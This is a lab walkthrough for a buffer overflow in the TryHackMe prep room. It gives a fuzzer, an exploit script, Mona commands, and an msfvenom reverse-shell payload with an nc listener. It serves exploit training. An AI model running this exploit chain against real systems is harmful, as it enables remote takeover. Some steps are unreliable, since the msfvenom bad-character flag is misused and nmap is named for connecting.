A _"buffer overflow"_ is like overfilling a glass of water: too much data poured into limited memory overflows, causing errors or exploitable security flaws.

## Prerequisites

### Immunity Debugger (Victim Machine)

Immunity Debugger is software used to analyze what is happening in the system when performing a buffer overflow attack.

### Vulnerable App (Victim Machine)

The vulnerable app could be a `.exe`, which we will exploit using the buffer overflow attack.

### Attacker Machine

A machine from which you are going to perform the attack.

## Connection

First and foremost, we need to connect to our target/victim machine. In my case, I'm working with the `TryHackMe BufferOverflow prep` room, so to connect, we have to start Immunity Debugger and launch the vulnerable app via: `File > Open > vulnerable_app.exe`. It should look like this:

![1](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/171c4c3f-ad29-46ac-a9c8-4874a78408d4)


Next, we need to start the app, either by:

- Pressing the little red play button
- Or by going to `Debug > Run`

Normally, the rectangle at the bottom right should now show `Running`

![Pasted image 20230731120338](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/4ce88a6c-4a11-4f3c-93fd-2d67b86a9241)

In my case, the app is running on `<ip> 1337`, and to connect, I need to establish a connection using _nmap_ from my attacker machine:

![Pasted image 20230731120502](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/827a0874-3b03-4f41-9080-73211084d3e2)


My connection is all set up, let's get to hacking now!!!

## Mona Config

_Mona_ is a built-in plugin in Immunity Debugger which helps us find results/go faster in our exploitation. You can interact with Mona at the bottom, there is an input; Mona commands start with `!mona <command>`

![Pasted image 20230731120951](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/41a4d164-8331-46f7-9572-66d9ab6cc463)

To make it easier, we're going to configure a `working folder` with Mona, you can do this by entering the command:

> `!mona config -set workingfolder c:\mona\%p`

## Fuzzing

The next part is called _fuzzing_, it's a software testing technique that involves injecting random or malformed input data to detect bugs, crashes, or security vulnerabilities. In our case, we're going to send packets of `100 bytes`, and see at which range the app crashes. On your attacker machine, you can create a script `fuzzer.py` and paste the following code:

```python
#!/usr/bin/env python3  
  
import socket, time, sys  
  
ip = "YOUR MACHINE IP"  
port = PORT  
timeout = 5  
prefix = "OVERFLOW1 " # In my case,its OVERFLOW1 (because its a tryhackme room)  
string = prefix + "A" * 100  
  
while True:  
  try:  
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
      s.settimeout(timeout)  
      s.connect((ip, port))  
      s.recv(1024)  
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))  
      s.send(bytes(string, "latin-1"))  
      s.recv(1024)  
  except:  
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))  
    sys.exit(0)  
  string += 100 * "A"  
  time.sleep(1)
```
(Or you can download the file directly from here:

[https://artyeth06.github.io/useful-files/fuzzer.py](https://artyeth06.github.io/useful-files/fuzzer.py)) Make sure to replace with your own information.

You can now start the script!

[Pasted image 20230731122028](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/581900c6-c7eb-4562-a9fb-50d8c940c1f3)
! Take a note of the range where the app crashes! 

In my example, the app crashed at **2000 bytes**.

## Cyclic Pattern

Now that we have the range, we need to generate a _cyclic pattern_. Here's a definition from Google:

> A cyclic pattern, also known as a De Bruijn sequence, is a sequence of characters that is generated in such a way that every possible combination of a certain length of characters appears exactly once. It's frequently used in software testing and debugging, specifically in buffer overflow exploitation.

In other words, it will help us to determine the _offset_ of the vulnerable app. To generate a cyclic pattern for our vulnerable app, we can use the following command:

> `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <APP CRASHED BYTES> + 400`

It will generate a list of characters which should look like this:

![Pasted image 20230731122607](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/08fe0873-ea99-4e01-8f99-5fd81b8ba0fa)

## Offset

Now that we generated our *cyclic pattern*,we need to find the *offset* (wich will help us to control the vulnerable app).
To do so,we can create a `exploit.py` script:

```python
import socket  
  
ip = "YOUR MACHINE IP"  
port = PORT
  
prefix = "OVERFLOW1 " #Again this is in my case  
offset = 0  
overflow = "A" * offset  
retn = ""  
padding = ""  
payload = "Paste the cyclic pattern that we generated"  
postfix = ""  
  
buffer = prefix + overflow + retn + padding + payload + postfix  
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
  
try:  
  s.connect((ip, port))  
  print("Sending evil buffer...")  
  s.send(bytes(buffer + "\r\n", "latin-1"))  
  print("Done!")  
except:  
  print("Could not connect.")
```
(Or you can directly dowload it from this link: https://artyeth06.github.io/useful-files/exploit.py)
We can now run this script (with the vulnerable app running)

![Pasted image 20230731123138](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/519a8ed6-82de-4572-bbd7-9f238d887fb7)

You will see that the app **crashes**, which is normal: 
![Pasted image 20230731123158](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/18ada4d2-5cfc-4fe5-bf24-4df03a959d7b)

Now, the final step to find the _offset_ of the vulnerable app is to use this command:

> `!mona findmsp -distance <crashed_at + 400>`

And then, you will normally see a line that looks like this:

> `EIP contains normal pattern : ... (offset XXXX)`

In my case:

![Pasted image 20230731123637](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/7fc03414-88b1-4928-8987-ebbc3816d56f)

Now, to verify that we have the correct _offset_, we can modify the `exploit.py` script with the following changes:

- Set **payload** back to empty
- Set the **offset** at your offset value (in my case `1978`)
- Set the **rtn** to `BBBB`

Restart the vulnerable app and launch your `exploit.py` script.

![Pasted image 20230731124203](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/0a7d6afe-9712-494f-a00d-fd640ada9ea9)
 The program has crashed (again...). We are looking for the `EIP register value` to be `42424242`. But why is that?

> In ASCII, the representation of B is 42 (So, B is the answer to everything?)

We have now confirmed that we have the correct _offset_!

## Finding Bad Characters

### Setting up Mona

The next step is to find what we call `bad characters` (characters that are considered harmful to the program, and thus, if our payload contains these characters the program will fail to execute)

We will need the help of _Mona_ to create a file called _bytearray.bin_ which is the file that contains the bad characters.

> By default, **\x00** is the first bad character.

To create the file we can use the following command (restart the app before doing it):

> `!mona bytearray -b "\x00"`

### List of Bad Characters

We have to create a list of bad characters (from **\x01** to **\xff**). We can create a `badchar.py` script:

python

`for x in range(1, 256):     print("\\x" + "{:02x}".format(x), end='')   print()`

(Or you can download it from this link:

[https://artyeth06.github.io/useful-files/badchar.py](https://artyeth06.github.io/useful-files/badchar.py))
Run the script to generate the list of bad chars:

![Pasted image 20230731125006](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/616c2b69-7129-4723-842d-423190f21026)

 Put this list in the payload variable.

### Exploit

Re-run the `exploit.py` script, and note the `ESP register value`. 

![Pasted image 20230731125223](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/d2dbd063-b2e6-478c-b545-3712c4957c29)

### Finding Bad Characters

Now, to find bad characters, we have to use the following command with Mona once again:

> `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP register value>`
> 
![Pasted image 20230731125618](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/327bc053-fff5-4139-8c16-c1cd445c3579)

We now have the list of possible bad characters!

### Removing Bad Characters

To remove the bad characters, you have to follow these steps:

1. Restart the Vulnerable App
2. Add the "next bad characters" in the _bytearrayfile_

> `!mona bytearray -b "\x00\xXX"`

3. Remove the bad characters from the payload list
4. Re-run the exploit
5. Note the ESP address
6. Compare with Mona

> `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP register value>`

7. Repeat all these steps until you get a message that you removed all the bad chars:
8. 
![Pasted image 20230731130226](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/66e30c49-abc2-44ae-b6a9-1ca507a7204b)

## Finding the Jump Point

A "jump point" refers to a specific location in memory that an attacker aims to overwrite with a new address to divert the program's execution flow. When a buffer overflow occurs, excessive data can overflow the buffer, and overwrite adjacent memory locations, including important pointers and return addresses.

To find the _jump point_, you can use the following command:

> `!mona jmp -r esp -cpb “Bad_char_list”`

![Pasted image 20230731130830](https://github.com/ArtyETH06/artyeth06.github.io/assets/107058122/68f69f48-ee09-4090-8191-a88f06bbecd0)


In my case `0x625011af`. We now have to convert the string to _Little Endian_ format (to be able to use it in our script)

Here is a script to convert to _Little Endian Format_
```python
import sys

def hex_to_little_endian(hex_string):
    # Supprime le préfixe "0x" de la chaîne hexadécimale si présent
    hex_string = hex_string.replace("0x", "")

    # Vérifie que la longueur de la chaîne est paire (nombre pair d'octets)
    if len(hex_string) % 2 != 0:
        raise ValueError("Invalid hex string. The length must be even.")

    # Convertit la chaîne hexadécimale en une séquence d'octets
    byte_sequence = bytes.fromhex(hex_string)

    # Inverse la séquence d'octets pour obtenir le format Little Endian
    little_endian_bytes = byte_sequence[::-1]

    # Formatte la séquence d'octets avec "\x" tous les deux caractères
    formatted_bytes = b"".join([b"\\x" + format(byte, "02x").encode() for byte in little_endian_bytes])

    return formatted_bytes

if __name__ == "__main__":
    # Vérifie si l'option -s et la chaîne hexadécimale sont spécifiées en ligne de commande
    if len(sys.argv) != 3 or sys.argv[1] != "-s":
        print("Usage: python script.py -s <hex_string>")
        sys.exit(1)

    # Récupère la chaîne hexadécimale passée en argument
    hex_string = sys.argv[2]

    try:
        # Appelle la fonction de conversion et affiche le résultat
        little_endian_result = hex_to_little_endian(hex_string)
        print("Input Hex String:", hex_string)
        print("Little Endian Bytes:", little_endian_result.decode())
    except ValueError as e:
        print("Error:", e)

```
(Or, you can directly download the script from this link: [https://artyeth06.github.io/useful-files/little_endian.py](https://artyeth06.github.io/useful-files/little_endian.py))

`0x625011af` corresponds to `\xaf\x11\x50\x62` in _Little Endian Format_

### Generating Payload

We now have to generate a final payload to take over the victim machine. We are going to use _msfvenom_ to create this payload:

(Make sure that msfvenom is installed on your machine)

> `msfvenom -p windows/shell_reverse_tcp LHOST=<Kali VPN IP> LPORT=4444 EXITFUNC=thread -b “LITTLE_ENDIAN_STRING” -f c`

We now have to modify our `exploit.py` script:

- Set the _rtn_ to the Little Endian String
- Set _padding_ to `"\x90" * 16`
- Set _payload_ to the msfvenom generated payload

## Get the Reverse Shell

We now just need to listen on port `4444` (the port we set in msfvenom), with _netcat_:

> `nc -lvnp 4444`

And the last thing: run the `exploit.py` script. And now we got a Reverse Shell!

## Credits

[TryHackMe](https://tryhackme.com/dashboard) for some inspiration and for the Buffer Overflow prep room. [vinayakagrawal95](https://vinayakagrawal95.medium.com/tryhackme-buffer-overflow-prep-overflow-1-fa843cc8582e) for his Medium post which helped me get through the first box and for some inspiration about the cheat sheet.
